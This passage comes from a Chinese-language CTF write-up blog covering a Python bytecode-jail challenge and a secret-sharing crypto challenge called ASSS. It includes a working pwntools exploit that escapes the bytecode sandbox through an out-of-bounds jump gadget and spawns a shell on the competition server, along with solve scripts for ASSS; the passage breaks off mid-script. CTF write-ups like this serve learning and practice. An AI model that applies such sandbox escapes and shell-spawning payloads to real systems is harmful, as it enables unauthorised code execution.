</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>names</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>5</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Invalid names </span><span class=si>{</span><span class=n>names</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>=</span> <span class=n>run</span><span class=o>.</span><span class=vm>__code__</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=n>co_code</span><span class=o>=</span><span class=n>inp</span><span class=p>,</span> <span class=n>co_names</span><span class=o>=</span><span class=n>names</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>inst</span> <span class=ow>in</span> <span class=n>dis</span><span class=o>.</span><span class=n>Bytecode</span><span class=p>(</span><span class=n>code</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=n>inst</span><span class=o>.</span><span class=n>opname</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;LOAD&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=ow>or</span> <span class=n>inst</span><span class=o>.</span><span class=n>opname</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;STORE&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=ow>or</span> <span class=n>inst</span><span class=o>.</span><span class=n>opname</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;IMPORT&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Invalid op </span><span class=si>{</span><span class=n>inst</span><span class=o>.</span><span class=n>opname</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>run</span><span class=o>.</span><span class=vm>__code__</span> <span class=o>=</span> <span class=n>code</span>
</span></span><span class=line><span class=cl><span class=n>run</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>字节码长度不能超过200字节，名称列表不能超过5个元素，禁用了<code>LOAD\STORE\IMPORT</code>，绕过之后进行命令执行</p><blockquote><p>JUMP_* opodes don&rsquo;t check bounds, so you can jump out of bounds to a bytecode gadget. find_gadgets.py finds gadgets that allow you to call exec(input()) given the appropriate co_names.</p></blockquote><p>用一下大佬的exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># useful links</span>
</span></span><span class=line><span class=cl><span class=c1># https://docs.python.org/3.10/library/dis.html</span>
</span></span><span class=line><span class=cl><span class=c1># https://github.com/python/cpython/blob/3.10/Include/cpython/code.h</span>
</span></span><span class=line><span class=cl><span class=c1># https://github.com/python/cpython/blob/3.10/Include/cpython/bytesobject.h</span>
</span></span><span class=line><span class=cl><span class=c1># https://github.com/python/cpython/blob/3.10/Python/ceval.c</span>
</span></span><span class=line><span class=cl><span class=c1># https://github.com/python/cpython/blob/main/Python/ceval_macros.h</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>dis</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>opcode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># from https://juliapoo.github.io/security/2021/05/29/load_fast-py3-vm.html</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inst</span><span class=p>(</span><span class=n>opc</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>arg</span><span class=p>:</span> <span class=nb>int</span> <span class=o>=</span> <span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;Makes life easier in writing python bytecode&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>nb</span> <span class=o>=</span> <span class=nb>max</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=p>(</span><span class=o>-</span><span class=n>arg</span><span class=o>.</span><span class=n>bit_length</span><span class=p>()</span> <span class=o>//</span> <span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>ab</span> <span class=o>=</span> <span class=n>arg</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=n>nb</span><span class=p>,</span> <span class=s2>&#34;big&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>ext_arg</span> <span class=o>=</span> <span class=n>opcode</span><span class=o>.</span><span class=n>opmap</span><span class=p>[</span><span class=s2>&#34;EXTENDED_ARG&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>	<span class=n>inst</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>nb</span> <span class=o>-</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=n>inst</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>ext_arg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>inst</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>ab</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>	<span class=n>inst</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>opcode</span><span class=o>.</span><span class=n>opmap</span><span class=p>[</span><span class=n>opc</span><span class=p>])</span>
</span></span><span class=line><span class=cl>	<span class=n>inst</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>ab</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>inst</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>found possible &lt;function MutableMapping.popitem at 0x7efe02c9d750&gt; collections.abc 6 8 1
</span></span></span><span class=line><span class=cl><span class=s2>975           0 SETUP_FINALLY            8 (to 18)
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>976           2 LOAD_GLOBAL              0 (next)
</span></span></span><span class=line><span class=cl><span class=s2>              4 LOAD_GLOBAL              1 (iter)
</span></span></span><span class=line><span class=cl><span class=s2>              6 LOAD_FAST                0 (self)
</span></span></span><span class=line><span class=cl><span class=s2>              8 CALL_FUNCTION            1
</span></span></span><span class=line><span class=cl><span class=s2>             10 CALL_FUNCTION            1
</span></span></span><span class=line><span class=cl><span class=s2>             12 STORE_FAST               1 (key)
</span></span></span><span class=line><span class=cl><span class=s2>             14 POP_BLOCK
</span></span></span><span class=line><span class=cl><span class=s2>             16 JUMP_FORWARD            10 (to 38)
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mi>1728880</span> <span class=o>+</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bytecode</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span>
</span></span><span class=line><span class=cl>	<span class=n>inst</span><span class=p>(</span><span class=s2>&#34;JUMP_ABSOLUTE&#34;</span><span class=p>,</span> <span class=n>offset</span> <span class=o>//</span> <span class=mi>2</span><span class=p>),</span>
</span></span><span class=line><span class=cl><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>bytecode</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>100</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x09</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dis</span><span class=o>.</span><span class=n>dis</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=c1>#s = remote(&#34;localhost&#34;, 1337)</span>
</span></span><span class=line><span class=cl>	<span class=n>s</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;monochromatic.atreides.b01lersc.tf&#34;</span><span class=p>,</span> <span class=mi>8443</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>s</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Bytecode: &#34;</span><span class=p>,</span> <span class=n>payload</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>	<span class=n>s</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Names: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;exec input&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>s</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;import os;os.system(&#39;sh&#39;)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>resp</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>recvrepeat</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=n>resp</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=ow>not</span> <span class=n>s</span><span class=o>.</span><span class=n>closed</span><span class=p>[</span><span class=s2>&#34;recv&#34;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>		<span class=n>s</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span>
</span></span><span class=line><span class=cl>	<span class=n>s</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=cryptoasss>crypto/ASSS</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>getPrime</span><span class=p>,</span> <span class=n>bytes_to_long</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>evaluate_poly</span><span class=p>(</span><span class=n>poly</span><span class=p>:</span><span class=nb>list</span><span class=p>,</span> <span class=n>x</span><span class=p>:</span><span class=nb>int</span><span class=p>,</span> <span class=n>s</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>s</span> <span class=o>+</span> <span class=nb>sum</span><span class=p>(</span><span class=n>co</span><span class=o>*</span><span class=n>x</span><span class=o>**</span><span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>co</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>poly</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;F:\Download\vibe_coding\vibe_coding\flag.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>poly</span> <span class=o>=</span> <span class=p>[</span><span class=n>a</span><span class=o>*</span><span class=n>getPrime</span><span class=p>(</span><span class=mi>64</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>20</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=n>share</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Here is a ^_^: </span><span class=si>{</span><span class=n>a</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Here is your share ^_^: (</span><span class=si>{</span><span class=n>share</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=n>evaluate_poly</span><span class=p>(</span><span class=n>poly</span><span class=p>,</span> <span class=n>share</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>让DeepSeek解，由于我本地字符串不长所以第一次写出这样的脚本就出了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=mi>12849363163568131049</span>
</span></span><span class=line><span class=cl><span class=n>x_share</span> <span class=o>=</span> <span class=mi>9885022587805378133</span>
</span></span><span class=line><span class=cl><span class=n>y</span> <span class=o>=</span> <span class=mi>1563796752766287440192561386095300665355947147226054326492540674752115058608754237675584842805847099061645243753986544838100172279457649108218153898075624071798459451731650752035308251078556301450839032666026929572335183726351864947225297686620831517537149472610596182151528298514239102103732926457046830544693491060510131686541057560458940388052012721626603608122833497565235251638381015764144844492</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 计算s mod a和s mod x</span>
</span></span><span class=line><span class=cl><span class=n>s_mod_a</span> <span class=o>=</span> <span class=n>y</span> <span class=o>%</span> <span class=n>a</span>
</span></span><span class=line><span class=cl><span class=n>s_mod_x</span> <span class=o>=</span> <span class=n>y</span> <span class=o>%</span> <span class=n>x_share</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 计算逆元</span>
</span></span><span class=line><span class=cl><span class=n>inv_x</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>x_share</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>inv_a</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>x_share</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 应用中国剩余定理</span>
</span></span><span class=line><span class=cl><span class=n>mod_product</span> <span class=o>=</span> <span class=n>a</span> <span class=o>*</span> <span class=n>x_share</span>
</span></span><span class=line><span class=cl><span class=n>s_crt</span> <span class=o>=</span> <span class=p>(</span><span class=n>s_mod_a</span> <span class=o>*</span> <span class=n>x_share</span> <span class=o>*</span> <span class=n>inv_x</span> <span class=o>+</span> <span class=n>s_mod_x</span> <span class=o>*</span> <span class=n>a</span> <span class=o>*</span> <span class=n>inv_a</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod_product</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 转换为字节</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>s_crt</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><p>但是我本地的字节数比较小，远程的字节数是66个字节长度，所以就出现在这里，如果字节过大的话就得用另一种方法解决了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a = 13110559150233569243
</span></span><span class=line><span class=cl>x_share = 15941377112010459173
</span></span><span class=line><span class=cl>y = 10112551066585014574263120617790516555254734704519913712045784081200773409049034115056646905446747136448683529305769247957236503841855733983637666617270259525558981918589694872485531368638162337624284026707631445433578380096139816242786349810280513174118911313953958679612208808027943871590957310853317435815638110296145797088067667987242667212601030830766240250618051616230485760004015890946465945621392
</span></span></code></pre></td></tr></table></div></div><p>看到最终WP要sagemath了，不过队友解出来了，放一下队友的exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sympy.ntheory.modular</span> <span class=kn>import</span> <span class=n>crt</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sympy</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>collect_data</span><span class=p>(</span><span class=n>num_connections</span><span class=o>=</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Collect data from the remote server&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>list1</span> <span class=o>=</span> <span class=p>[]</span>  <span class=c1># Moduli list</span>
</span></span><span class=line><span class=cl>    <span class=n>list2</span> <span class=o>=</span> <span class=p>[]</span>  <span class=c1># Share list</span>
</span></span><span class=line><span class=cl>    <span class=n>list3</span> <span class=o>=</span> <span class=p>[]</span>  <span class=c1># Values list (large numbers)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>num_connections</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;asss.atreides.b01lersc.tf&#39;</span><span class=p>,</span> <span class=mi>8443</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=c1># Get first value</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Here is a ^_^: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>a</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>a</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>a</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>),</span> <span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>list1</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=c1># Get share values</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;share ^_^: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=n>b</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=n>b</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;, &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>list2</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>b</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>:],</span> <span class=mi>10</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>list3</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>b</span><span class=p>[</span><span class=mi>1</span><span class=p>][:</span><span class=o>-</span><span class=mi>1</span><span class=p>],</span> <span class=mi>10</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Connection </span><span class=si>{</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2>/</span><span class=si>{</span><span class=n>num_connections</span><span class=si>}</span><span class=s2> completed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>  <span class=c1># Avoid overwhelming the server</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
